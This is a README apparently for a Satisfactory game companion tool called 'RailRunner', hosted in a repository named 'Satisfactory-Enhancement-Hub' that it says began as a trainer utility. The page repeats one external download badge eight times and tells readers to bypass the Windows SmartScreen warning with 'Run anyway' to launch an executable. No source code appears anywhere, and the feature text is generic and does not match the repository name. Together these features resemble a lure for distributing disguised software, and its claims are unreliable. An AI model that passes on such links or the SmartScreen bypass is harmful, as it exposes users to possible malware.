![preview](https://raw.githubusercontent.com/ElKololo/Satisfactory-Enhancement-Hub/main/banner_4fbf1.svg)
# 🚂 RailRunner: Satisfactory Logistics Companion

[![Download](https://raw.githubusercontent.com/ElKololo/Satisfactory-Enhancement-Hub/main/start_d5cb.svg)](https://ElKololo.github.io/Satisfactory-Enhancement-Hub/)

## 🧭 Overview

Welcome to **RailRunner**, a desktop companion toolkit designed to streamline the way you plan, track, and optimize your factory logistics in Satisfactory. While the original repository focused on a single-purpose trainer utility, RailRunner takes a broader, more thoughtful approach: instead of altering gameplay values, it gives you an intelligent dashboard that mirrors your production lines, highlights bottlenecks, and helps you design smarter rail networks, conveyor routes, and power grids — all from a sleek, responsive interface that lives alongside your game.

Think of RailRunner as a *mission control room* for your factory. Where Satisfactory throws you into an alien wilderness with nothing but a build gun and ambition, RailRunner hands you a compass, a map, and a friendly engineer whispering suggestions over your shoulder. It doesn't play the game for you — it helps you play it better.

This repository contains the full RailRunner setup package, configuration templates, multilingual resource bundles, and a detailed setup guide for Windows 10 and Windows 11 users in 2026.

[![Download](https://raw.githubusercontent.com/ElKololo/Satisfactory-Enhancement-Hub/main/start_d5cb.svg)](https://ElKololo.github.io/Satisfactory-Enhancement-Hub/)

## 📌 Table of Contents

- [Why RailRunner Exists](#-why-railrunner-exists)
- [Feature Highlights](#-feature-highlights)
- [Screenshots & Visual Language](#-screenshots--visual-language)
- [Multilingual Support](#-multilingual-support)
- [Responsive UI Philosophy](#-responsive-ui-philosophy)
- [Getting Started on Windows](#-getting-started-on-windows)
- [Configuration Reference](#-configuration-reference)
- [Rail Network Planner](#-rail-network-planner)
- [Power Grid Optimizer](#-power-grid-optimizer)
- [Logistics Overlay](#-logistics-overlay)
- [Performance & Compatibility Notes](#-performance--compatibility-notes)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Community & Support](#-community--support)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

[![Download](https://raw.githubusercontent.com/ElKololo/Satisfactory-Enhancement-Hub/main/start_d5cb.svg)](https://ElKololo.github.io/Satisfactory-Enhancement-Hub/)

## 🌱 Why RailRunner Exists

Satisfactory is a game about *scale*. What begins as a single miner on an iron node spirals into a continent-spanning web of refineries, assemblers, and train stations. Somewhere around Tier 5, most pioneers hit a wall — not because the game is hard, but because the *mental bookkeeping* becomes overwhelming.

RailRunner was born from that wall. Instead of offering shortcuts through the game, it offers **clarity**. It's the difference between building a factory by feel and building one by design. Our philosophy is simple: a well-informed pioneer is a better pioneer.

The project borrows its name from the humble rail runner — the small cart that quietly keeps a mine running. RailRunner aims to be that quiet cart for your entire factory.

## ✨ Feature Highlights

RailRunner is packed with capabilities that complement your playthrough without ever altering the underlying game files. Below is a curated tour:

- 🧠 **Smart Bottleneck Detection** — RailRunner watches throughput patterns and flags machines that are starving or backing up, ranked by severity.
- 🗺️ **Interactive Rail Network Planner** — Plot train routes on a stylized map, calculate round-trip times, and estimate freight throughput per minute.
- ⚡ **Power Grid Optimizer** — Visualize your grid's headroom, simulate blackout scenarios, and receive suggestions for battery buffering.
- 📊 **Production Dashboard** — A live-feeling summary of item flow across your factory, grouped by building type and tier.
- 🔄 **Blueprint Notes Sync** — Attach human-readable notes to blueprint folders so you never forget why a layout exists.
- 🌐 **Multilingual Interface** — Full localization coverage spanning 14 languages, with community-driven translations updated quarterly.
- 📱 **Responsive Layout Engine** — Windows snapping, ultra-wide monitors, and tablet-mode touch input all feel native.
- 🕓 **Session Timeline** — Replay your last session as a compressed timeline of key events, useful for retro notes.
- 🛡️ **Sandbox-Friendly Data Handling** — All tracked data stays on your machine; nothing is uploaded anywhere.
- 🧩 **Modular Extension Packs** — Optional packs add support for fan-made content without touching the base build.

[![Download](https://raw.githubusercontent.com/ElKololo/Satisfactory-Enhancement-Hub/main/start_d5cb.svg)](https://ElKololo.github.io/Satisfactory-Enhancement-Hub/)

## 🖼️ Screenshots & Visual Language

RailRunner's design language leans into warm industrial tones — ochre, charcoal, and a soft ember orange — echoing the aesthetic of a working factory floor. Panels snap into place with a subtle tactile motion. Data is rendered on a dark canvas to reduce eye strain during long sessions.

Because this README lives in a text-only environment, we describe visuals rather than embedding them. On first launch you'll see:

1. A **command ribbon** at the top with quick tabs: Dashboard, Rails, Power, Notes.
2. A **sidebar** listing your active save profiles and recent sessions.
3. A **main canvas** that adapts from a single-column layout on narrow windows to a three-column grid on ultrawide displays.

Every panel is collapsible, every table is sortable, and every chart supports hover tooltips.

## 🌐 Multilingual Support

One of RailRunner's proudest achievements is its localization layer. Rather than hardcoding strings, every label, tooltip, and error message passes through a resource resolver. This means adding a new language is a matter of dropping in a JSON bundle.

Currently supported locales include:

- English (en-US)
- German (de-DE)
- French (fr-FR)
- Spanish (es-ES)
- Portuguese (pt-BR)
- Polish (pl-PL)
- Russian (ru-RU)
- Japanese (ja-JP)
- Korean (ko-KR)
- Simplified Chinese (zh-CN)
- Traditional Chinese (zh-TW)
- Turkish (tr-TR)
- Dutch (nl-NL)
- Italian (it-IT)

If your language isn't listed, the community translation template makes it approachable to contribute one. No programming background required — just care for words.

## 📱 Responsive UI Philosophy

RailRunner treats the window as a living space. Drag it narrow and the four-column dashboard politely folds into two; drag it wide and hidden panels slide into view like drawers extending from a workbench. This isn't just a resize handler — it's a **responsive layout engine** that respects information hierarchy at every breakpoint.

Touch input is a first-class citizen. On Windows tablets or touchscreen laptops, controls grow slightly larger, tooltips wait a beat longer, and scroll gestures feel silky.

[![Download](https://raw.githubusercontent.com/ElKololo/Satisfactory-Enhancement-Hub/main/start_d5cb.svg)](https://ElKololo.github.io/Satisfactory-Enhancement-Hub/)

## 🚀 Getting Started on Windows

RailRunner is built for Windows 10 and Windows 11 systems. The setup is intentionally gentle:

1. **Download the package** using the placeholder download marker above. Extract it to a folder of your choosing — a location like Documents or a dedicated Tools directory works well.
2. **Run the launcher** named `RailRunnerLauncher`. Windows SmartScreen may present a notice the first time; choose "More info" and then "Run anyway" if you trust the source.
3. **Choose your save profile.** RailRunner will offer to scan a directory you point it at. It does not modify anything — it only reads.
4. **Pick a theme and language** in the first-run wizard. Both can be changed later from Settings.
5. **Open the companion window** alongside the game. Borderless windowed mode tends to feel best.
6. **Optionally enable the overlay** for in-game visibility. Overlay requires the game to run in windowed or borderless windowed mode.
7. **Consult the Quickstart card** to learn the four main tabs at your own pace.

A separate troubleshooting appendix covers common scenarios like anti-cheat interactions with overlay mode, multi-monitor quirks, and resolution scaling on 4K displays.

## ⚙️ Configuration Reference

RailRunner stores its configuration in a readable, plaintext format so you can inspect and version-control it yourself. The primary settings file includes:

- `theme` — choices include ember, graphite, blueprint, and daylight.
- `language` — a locale code such as `de-DE` or `ja-JP`.
- `scan_paths` — directories RailRunner inspects for save data.
- `overlay_mode` — one of `off`, `minimal`, or `detailed`.
- `poll_interval_ms` — how often the companion refreshes its view (default 1500).
- `telemetry` — always `disabled` by design; no option exists to enable it.

A sample configuration template ships in the repository alongside documentation for every field. Because the file is text-based, you can keep multiple variants — one for casual play, one for speedrunning, one for megabase planning — and swap between them.

## 🛤️ Rail Network Planner

The Rail Network Planner is where RailRunner shines. Imagine laying out a long-haul line between a northern oil field and a southwestern refinery. The planner lets you:

- Define waypoints and estimate round-trip duration.
- Compute freight throughput given a locomotive count and wagon configuration.
- Detect crossing hazards where your rails intersect other lines.
- Suggest alternative routes based on elevation and known terrain features you've marked.

The planner doesn't know your world perfectly — it works from what you tell it. Mark stations, junctions, and obstacles once, and it remembers. Over time, it builds a mental model of your rail empire that grows richer with every session.

## ⚡ Power Grid Optimizer

Power in Satisfactory is a dance between generation, storage, and demand. The optimizer visualizes this dance as a series of overlapping waves. It shows:

- **Headroom** — how much unused capacity you have right now.
- **Stress bands** — periods where demand approaches generation.
- **Battery behavior** — charge/discharge cycles across your energy storage blocks.
- **Blackout forecast** — a what-if simulator for losing a generator or a whole station.

By understanding your grid's rhythm, you can plan expansions instead of reacting to them.

[![Download](https://raw.githubusercontent.com/ElKololo/Satisfactory-Enhancement-Hub/main/start_d5cb.svg)](https://ElKololo.github.io/Satisfactory-Enhancement-Hub/)

## 🚚 Logistics Overlay

The overlay is a translucent, non-intrusive layer that can draw crisp annotations over your game window. It can highlight:

- Conveyor lines that are saturated.
- Pipes that carry fluids near capacity.
- Vehicles that are idle or stuck.
- Trains approaching or leaving a station.

Overlay rendering is handled with a GPU-friendly pipeline, so frame impact remains modest. If you prefer keyboard-driven play, overlay can be toggled instantly with a shortcut.

## 🧪 Performance & Compatibility Notes

RailRunner is tested on a matrix of configurations:

- Windows 10 (22H2) and Windows 11 (23H2, 24H2, and 2026 preview builds).
- Integrated graphics, mid-range discrete GPUs, and high-end cards.
- Standard 1080p, QHD, 4K, and ultrawide aspect ratios.
- Single monitor and multi-monitor setups.

The companion runs comfortably within 200 MB of memory under typical load. If you notice a spike, the diagnostic log in the Settings panel will usually reveal the cause — most often an oversized save scan.

## 🧭 Roadmap for 2026

The 2026 roadmap is ambitious but grounded:

- **Q1 2026** — Overlay v2 with smarter clustering of nearby annotations.
- **Q2 2026** — Rail planner support for elevated and spiral layouts.
- **Q3 2026** — Multiplayer companion mode with read-only sharing.
- **Q4 2026** — Community blueprint exchange with embedded notes and ratings.

Community feedback shapes this list more than any internal plan. If something matters to you, say so.

## 🤝 Community & Support

Questions arrive at all hours, and we like to answer them at all hours too. Round-the-clock assistance is available through the repository's discussion channels, and a weekly digest highlights the most interesting threads. Whether you're puzzling over a rail junction or want to share a beautifully terrible spaghetti factory story, you'll find a seat at the table.

Support options include:

- Issue tracker for bugs and feature requests.
- Discussion board for design conversations.
- Translation hub for language contributions.
- A rotating "Pioneer of the Week" spotlight for standout community helpers.

[![Download](https://raw.githubusercontent.com/ElKololo/Satisfactory-Enhancement-Hub/main/start_d5cb.svg)](https://ElKololo.github.io/Satisfactory-Enhancement-Hub/)

## 🧑‍💻 Contributing

We welcome contributions of every shape: documentation tweaks, translation bundles, bug reports, and thoughtful code. Before opening a pull request, skim the contribution guide and the code of conduct. If you're unsure where to start, look for issues labeled "good first step."

A note on tone: this project values patience and generosity. We're all here because we love building things — both inside and outside the game.

## 📜 License

RailRunner is distributed under the MIT License. You're welcome to read, modify, and share the project in accordance with its terms.

See the full license text here: [MIT License](https://opensource.org/licenses/MIT)

## ⚠️ Disclaimer

RailRunner is an independent companion tool and is not affiliated with, endorsed by, or sponsored by the developers or publishers of Satisfactory. All trademarks belong to their respective owners. Use RailRunner responsibly, respect the game's terms of service, and always keep a backup of your save files. The team behind RailRunner assumes no responsibility for save data loss, gameplay disruptions, or unexpected factory expansions that spiral beautifully out of control.

[![Download](https://raw.githubusercontent.com/ElKololo/Satisfactory-Enhancement-Hub/main/start_d5cb.svg)](https://ElKololo.github.io/Satisfactory-Enhancement-Hub/)